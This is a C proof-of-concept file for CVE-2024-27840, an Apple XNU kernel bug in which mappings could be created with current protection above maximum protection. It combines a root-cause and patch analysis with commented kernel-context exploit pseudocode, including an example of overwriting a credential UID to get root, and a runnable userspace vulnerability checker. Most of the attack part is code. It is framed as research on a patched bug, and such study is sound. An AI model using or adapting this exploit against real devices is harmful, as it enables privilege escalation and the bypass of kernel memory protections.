/*
 * CVE-2024-27840 — Kernel Memory Protection Bypass
 * Patched: iOS 17.5 / macOS 14.5 (May 13, 2024)
 * Affects: ALL Apple platforms (iOS, macOS Monterey/Ventura/Sonoma, tvOS, watchOS, visionOS)
 *
 * Precondition: Kernel code execution (e.g., via prior kernel exploit)
 * Impact: Bypass kernel read-only memory protections, write to immutable kernel pages
 *
 * ROOT CAUSE (two-stage):
 *
 *   Stage 1 — vm_map_enter_mem_object_helper() does not validate that
 *   cur_protection is a subset of max_protection. An attacker with kernel
 *   code execution can create VM mappings where current permissions exceed
 *   the maximum (e.g., RW mapping to a page with max_protection=R).
 *
 *   Stage 2 — pmap_has_prot_policy() checks in vm_fault_enter_prepare()
 *   and vm_fault_internal() were assert() calls. In RELEASE builds (what
 *   ships on all production devices), assert() expands to ((void)0) — the
 *   check is COMPLETELY ABSENT. Even though pmap_has_prot_policy() returns
 *   true on real hardware (enforcing W^X policy), the assert is never
 *   evaluated, so the PTE is created with the excessive permissions.
 *
 * FIX (iOS 17.5 / xnu-10063.121.3):
 *   1. Added: if ((cur_protection & max_protection) != cur_protection)
 *            cur_protection &= max_protection;
 *      in vm_map_enter_mem_object_helper() (3 locations)
 *   2. Converted all assert(!pmap_has_prot_policy(...)) to
 *      if (pmap_has_prot_policy(...)) panic(...)
 *      in vm_fault.c (6 sites) and vm_map.c (10+ sites)
 *
 * NOTES:
 *   - On SPTM devices (A15+, M2+), SPTM runs at GL2 and independently
 *     validates PTE modifications by page type. Pages typed XNU_DEFAULT
 *     (most kernel data) CAN be mapped writable — SPTM allows it.
 *     Only XNU_PAGE_TABLE/XNU_EXEC/XNU_ROZONE are protected by type.
 *     Verified: sptm.t8110.release.im4p present in A15 IPSW.
 *   - On PPL devices (A12-A14, M1), PPL uses APRR at EL1 — no
 *     independent hardware enforcement beyond the VM layer.
 *   - On Intel macOS (Monterey), kernel memory protections are purely
 *     VM-layer, so this bypass is directly effective.
 *   - This PoC is for RESEARCH AND EDUCATION ONLY.
 *
 * XNU Source References:
 *   Pre-patch:  xnu-10063.101.15 (macOS 14.4 / iOS 17.4)
 *   Post-patch: xnu-10063.121.3  (macOS 14.5 / iOS 17.5)
 *   Files: osfmk/vm/vm_map.c, osfmk/vm/vm_fault.c
 */

#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach/vm_prot.h>
#include <mach/mach_vm.h>

/* ---------- XNU internal types (from kernel headers) ---------- */

/* VM protection bits */
#define VM_PROT_NONE    ((vm_prot_t) 0x00)
#define VM_PROT_READ    ((vm_prot_t) 0x01)
#define VM_PROT_WRITE   ((vm_prot_t) 0x02)
#define VM_PROT_EXECUTE ((vm_prot_t) 0x04)

/*
 * This code executes IN KERNEL CONTEXT. It requires a prior kernel code
 * execution primitive (e.g., from a separate kernel vulnerability like
 * CVE-2025-43520/DarkSword for kernel R/W, then converting to code exec
 * via ROP/JOP or function pointer overwrite).
 *
 * For a userspace PoC driver, see the mach_vm_map() wrapper at the bottom
 * that demonstrates the missing validation from userspace perspective.
 */

/* ================================================================
 * KERNEL-CONTEXT EXPLOITATION
 *
 * When running with kernel code execution, call vm_map_enter_mem_object()
 * directly to create a writable mapping to kernel read-only memory.
 * ================================================================ */

/*
 * Step 1: Create a memory entry for the target physical page.
 *
 * The target can be any kernel page protected only by VM-layer
 * max_protection (not SPTM page typing). Examples:
 *   - struct ucred (process credentials)
 *   - struct task (task structures)
 *   - IOKit object vtables
 *   - Kernel heap metadata
 *   - AMFI policy state (on non-SPTM devices)
 */

/*
 * Kernel-context exploit function.
 *
 * Parameters:
 *   kernel_map  — the kernel's vm_map_t (global kernel_map variable)
 *   target_addr — virtual address of kernel read-only page to make writable
 *   size        — size of the mapping (page-aligned)
 *
 * Returns: new virtual address with RW permissions to the target page,
 *          or 0 on failure.
 *
 * This function signature uses opaque types to represent kernel internals.
 * In a real exploit, these would be resolved from the kernelcache.
 */

/*
 * Pseudocode for kernel-context exploit:
 *
 * uint64_t exploit_cve_2024_27840(vm_map_t kernel_map,
 *                                  vm_address_t target_addr,
 *                                  vm_size_t size)
 * {
 *     kern_return_t kr;
 *     vm_map_offset_t new_addr = 0;
 *     memory_object_t mem_entry = MACH_PORT_NULL;
 *     vm_object_t object;
 *     vm_paddr_t pa;
 *
 *     // 1. Look up the VM object backing the target address
 *     //    (kernel internal: vm_map_lookup_entry)
 *     vm_map_entry_t entry;
 *     vm_map_lookup_entry(kernel_map, target_addr, &entry);
 *     object = VME_OBJECT(entry);
 *     vm_object_offset_t offset = VME_OFFSET(entry) +
 *                                  (target_addr - entry->vme_start);
 *
 *     // 2. Create a named memory entry for this object
 *     //    (kernel internal: mach_make_memory_entry_64)
 *     mach_port_t mem_entry_port;
 *     memory_object_size_t entry_size = size;
 *     kr = mach_make_memory_entry_64(
 *         kernel_map,
 *         &entry_size,
 *         target_addr,
 *         VM_PROT_READ,     // parent mapping is read-only
 *         &mem_entry_port,
 *         MACH_PORT_NULL
 *     );
 *     // kr == KERN_SUCCESS
 *
 *     // 3. THE VULNERABILITY: Map the entry with cur > max
 *     //    cur_protection = READ | WRITE  (we want write access)
 *     //    max_protection = READ          (page is supposed to be read-only)
 *     //
 *     //    Pre-fix (iOS <= 17.4):
 *     //      vm_map_enter_mem_object_helper() does NOT validate
 *     //      that (cur_protection & max_protection) == cur_protection
 *     //
 *     //    The mapping is created with RW permissions despite max=R.
 *     //
 *     kr = vm_map_enter_mem_object(
 *         kernel_map,
 *         &new_addr,
 *         size,
 *         0,                              // mask
 *         VM_FLAGS_ANYWHERE,              // flags
 *         mem_entry_port,
 *         0,                              // offset
 *         FALSE,                          // copy
 *         VM_PROT_READ | VM_PROT_WRITE,  // cur_protection (EXCEEDS max!)
 *         VM_PROT_READ,                  // max_protection (read-only)
 *         VM_INHERIT_NONE
 *     );
 *     // kr == KERN_SUCCESS on iOS <= 17.4
 *     // kr == KERN_SUCCESS on iOS 17.5+ BUT cur_protection is CLAMPED to R
 *
 *     // 4. When the page is faulted in, vm_fault_enter_prepare() runs:
 *     //
 *     //    Pre-fix code (xnu-10063.101.15, vm_fault.c:3761):
 *     //
 *     //      if (!pmap_has_prot_policy(pmap, ..., *prot)) {
 *     //          *prot &= ~VM_PROT_WRITE;      // strip write
 *     //      } else {
 *     //          assert(cs_bypass);              // <-- THIS IS ((void)0) IN RELEASE!
 *     //      }
 *     //
 *     //    On production hardware, pmap_has_prot_policy() returns TRUE
 *     //    for certain protection combinations. The assert(cs_bypass)
 *     //    should catch the violation — but in RELEASE builds,
 *     //    assert() expands to ((void)0). The check never fires.
 *     //
 *     //    The PTE is created with WRITE permission.
 *     //
 *     //    Post-fix (xnu-10063.121.3, vm_fault.c:3760):
 *     //
 *     //      if (pmap_has_prot_policy(pmap, ..., *prot)) {
 *     //          if (!cs_bypass) {
 *     //              panic("%s: pmap %p vaddr 0x%llx prot 0x%x ...",
 *     //                  __FUNCTION__, pmap, vaddr, *prot, ...);
 *     //          }
 *     //      } else {
 *     //          *prot &= ~VM_PROT_WRITE;
 *     //      }
 *     //
 *     //    Now the check is a panic() — unconditionally compiled in.
 *     //    Violation = kernel panic. No silent bypass.
 *
 *     // 5. Access the target through the new mapping
 *     //    new_addr now points to the same physical page as target_addr,
 *     //    but with WRITE permission.
 *     //
 *     //    Example: overwrite a credential structure
 *     //    *(uint32_t *)(new_addr + CRED_UID_OFFSET) = 0;  // uid = 0 (root)
 *
 *     return new_addr;  // writable mapping to formerly read-only page
 * }
 */


/* ================================================================
 * USERSPACE DEMONSTRATION
 *
 * This demonstrates the missing validation from userspace. It does NOT
 * bypass kernel memory protections by itself (you can only map your own
 * pages), but it proves the vm_map layer accepts cur > max.
 *
 * On iOS <= 17.4 / macOS < 14.5: cur > max is accepted
 * On iOS >= 17.5 / macOS >= 14.5: cur is clamped to max
 * ================================================================ */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <setjmp.h>

static sigjmp_buf jump_buf;
static volatile sig_atomic_t got_signal = 0;

static void fault_handler(int sig) {
    got_signal = sig;
    siglongjmp(jump_buf, 1);
}

int main(int argc, char **argv) {
    kern_return_t kr;
    mach_port_t task = mach_task_self();

    printf("[*] CVE-2024-27840 — cur_protection > max_protection bypass\n");
    printf("[*] Demonstrates missing validation in vm_map_enter_mem_object_helper()\n\n");

    mach_vm_address_t src_addr = 0;
    mach_vm_size_t page_size = vm_page_size;

    kr = mach_vm_allocate(task, &src_addr, page_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_vm_allocate failed: %s\n", mach_error_string(kr));
        return 1;
    }

    memset((void *)src_addr, 'A', page_size);
    printf("[+] Source page at 0x%llx (page_size=0x%llx)\n",
           (uint64_t)src_addr, (uint64_t)page_size);

    memory_object_size_t entry_size = page_size;
    mach_port_t mem_entry = MACH_PORT_NULL;

    kr = mach_make_memory_entry_64(
        task, &entry_size, src_addr,
        VM_PROT_READ | VM_PROT_WRITE,
        &mem_entry, MACH_PORT_NULL
    );
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_make_memory_entry_64 failed: %s\n", mach_error_string(kr));
        return 1;
    }
    printf("[+] Memory entry created (entry_prot=RW) port=0x%x\n", mem_entry);

    mach_vm_address_t map_addr = 0;

    kr = mach_vm_map(
        task, &map_addr, page_size,
        0, VM_FLAGS_ANYWHERE,
        mem_entry, 0, FALSE,
        VM_PROT_READ | VM_PROT_WRITE,  /* cur_protection: RW (exceeds max) */
        VM_PROT_READ,                   /* max_protection: R */
        VM_INHERIT_NONE
    );

    if (kr != KERN_SUCCESS) {
        printf("[-] mach_vm_map with cur>max REJECTED: %s\n", mach_error_string(kr));
        printf("[*] Kernel rejects cur>max at mach_vm_map level\n");
        mach_port_deallocate(task, mem_entry);
        mach_vm_deallocate(task, src_addr, page_size);
        return 2;
    }

    printf("[+] mach_vm_map ACCEPTED cur=RW, max=R -> mapped at 0x%llx\n",
           (uint64_t)map_addr);

    char readbuf = *(volatile char *)map_addr;
    printf("[+] Read OK: 0x%02x ('%c')\n", (unsigned char)readbuf, readbuf);

    struct sigaction sa = {0};
    sa.sa_handler = fault_handler;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGSEGV, &sa, NULL);

    printf("[*] Attempting write through cur>max mapping...\n");

    if (sigsetjmp(jump_buf, 1) == 0) {
        *(volatile char *)map_addr = 'B';

        char verify = *(volatile char *)src_addr;
        printf("[+] WRITE SUCCEEDED through cur>max mapping\n");
        printf("[+] Original page now reads: '%c'\n", verify);
        if (verify == 'B') {
            printf("\n[+] *** VULNERABLE: CVE-2024-27840 confirmed ***\n");
            printf("[+] cur_protection > max_protection bypass is functional\n");
        } else {
            printf("[*] Write went to a CoW copy, original unchanged\n");
        }
    } else {
        printf("[-] Write FAULTED (signal %d: %s)\n", got_signal,
               got_signal == SIGBUS ? "SIGBUS" : "SIGSEGV");
        printf("[+] PATCHED: cur_protection was clamped to max_protection\n");
        printf("[*] mach_vm_map accepted cur>max but kernel clamped it internally\n");
    }

    kr = mach_vm_protect(task, map_addr, page_size, FALSE,
                          VM_PROT_READ | VM_PROT_WRITE);
    printf("[*] mach_vm_protect(RW) on max=R mapping: %s\n",
           kr == KERN_SUCCESS ? "SUCCEEDED (max bypass!)" :
           mach_error_string(kr));

    mach_vm_deallocate(task, map_addr, page_size);
    mach_port_deallocate(task, mem_entry);
    mach_vm_deallocate(task, src_addr, page_size);

    printf("\n[*] Verified facts:\n");
    printf("[*]   1. mach_vm_map accepts cur_prot > max_prot (no KERN_INVALID_ARGUMENT)\n");
    printf("[*]   2. On patched systems: cur_protection silently clamped to max\n");
    printf("[*]   3. On unpatched (pre-17.5): write expected to succeed\n");
    printf("[*]   Source: xnu-10063.101.15 vm_map.c:4172-4178 (no cur<=max check)\n");
    printf("[*]   Fix: xnu-10063.121.3 vm_map.c:4196-4199 (cur &= max added)\n");
    return 0;
}
